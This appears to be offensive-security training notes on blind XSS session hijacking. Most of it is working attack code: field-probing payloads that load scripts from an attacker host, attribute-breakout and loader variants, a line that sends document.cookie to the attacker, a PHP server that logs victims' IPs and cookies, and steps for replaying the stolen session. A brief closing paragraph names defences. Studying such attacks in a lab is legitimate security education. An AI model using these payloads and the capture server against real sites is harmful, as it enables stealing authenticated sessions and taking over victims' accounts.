# XSS Session Hijacking

Session hijacking via XSS is the most directly impactful attack in this module. Instead of tricking a user into submitting credentials, you steal an already-authenticated session token, bypassing authentication entirely without ever knowing the victim's password.

***

## Blind XSS: The Added Challenge

Standard XSS testing relies on seeing the alert pop-up to confirm execution. Blind XSS removes that feedback loop because the payload fires in a restricted panel you cannot access, typically an admin interface reviewing user-submitted data. You are injecting into a black box.

Common blind XSS entry points:

- User registration fields reviewed by admins
- Support ticket or contact form submissions
- Product reviews in e-commerce platforms
- HTTP `User-Agent` or `Referer` headers logged in admin dashboards
- File upload filenames displayed in a file manager

The solution is to replace the alert with an outbound HTTP request. If your payload executes, your server receives a hit. If it does not, nothing arrives.

***

## Identifying the Vulnerable Field

Because you cannot see which field triggers execution, you encode the field name into the request path. Each field gets a unique payload pointing to a different URL:

```html
<!-- Full name field -->
<script src=http://OUR_IP/fullname></script>

<!-- Username field -->
<script src=http://OUR_IP/username></script>

<!-- Phone field -->
<script src=http://OUR_IP/phone></script>

<!-- Address field -->
<script src=http://OUR_IP/address></script>
```

When your PHP server logs a hit for `/username`, you know the username field is vulnerable and which payload structure broke through. Fields like email (validated format) and password (hashed before storage) can be deprioritised since they are unlikely to reflect raw input.

### Payload Variants for Different Injection Contexts

A single payload structure will not work for every backend context. Use variants to cover different scenarios:

```html
<!-- Standard script tag -->
<script src=http://OUR_IP/field></script>

<!-- Breaking out of an attribute value with single quote -->
'><script src=http://OUR_IP/field></script>

<!-- Breaking out of an attribute value with double quote -->
"><script src=http://OUR_IP/field></script>

<!-- JavaScript URI for href/src contexts -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<!-- XMLHttpRequest approach for CSP bypass attempts -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<!-- jQuery shorthand if jQuery is loaded -->
<script>$.getScript("http://OUR_IP/field")</script>
```

***

## The Cookie Stealing Payload

Once you have a confirmed working payload and vulnerable field, replace the probe script reference with a cookie-stealing script. The two main JavaScript approaches differ in how they exfiltrate data:

| Method | Mechanism | Suspicion level |
|--------|-----------|----------------|
| `document.location='http://OUR_IP/index.php?c='+document.cookie` | Redirects the victim's browser to your server | Higher: page navigation is visible |
| `new Image().src='http://OUR_IP/index.php?c='+document.cookie` | Creates an invisible image request | Lower: no visible page change |

The image approach is preferred. Write it to `script.js` on your server:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Then the XSS payload in the vulnerable field loads that script remotely:

```html
<script src=http://OUR_IP/script.js></script>
```

This two-stage approach means the actual malicious logic lives on your server, not in the injection. You can update `script.js` without re-injecting.

***

## Setting Up the Capture Server

The PHP listener parses, decodes, and logs each cookie value on a separate line, handling multiple cookies per victim and multiple victims over time:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start the server:

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# write script.js and index.php here
sudo php -S 0.0.0.0:80
```

When the admin views the vulnerable page, you see two sequential hits in the server log:

```
10.10.10.10:52798 [200]: /script.js        # browser fetches your JS
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

The first request confirms the XSS fired and loaded your script. The second delivers the cookie.

***

## Using the Stolen Cookie

With the session cookie value from `cookies.txt`, you impersonate the victim without credentials:

1. Navigate to the target login page in your browser
2. Open DevTools, press Shift+F9 in Firefox to show the Storage bar
3. Click the `+` button to add a new cookie manually
4. Set `Name` to the part before `=` in the stolen value (e.g., `cookie`)
5. Set `Value` to the part after `=` (e.g., `f904f93c949d19d870911bf8b05fe7b2`)
6. Refresh the page

The server sees a valid session token and grants access as the victim. No password was ever needed.

***

## Why This Is Difficult to Defend Against

The attack chain has no step that requires a visible anomaly from the victim's perspective. The admin views what appears to be a normal registration submission, the XSS payload fires silently, the image request to your server is invisible, and nothing on screen changes. The entire attack completes without the victim performing any unusual action. The only reliable defences are server-side output encoding when rendering user-submitted data in admin panels, `HttpOnly` cookie flags to block JavaScript access to session cookies entirely, and a strict `Content-Security-Policy` that blocks outbound script requests to unknown domains.
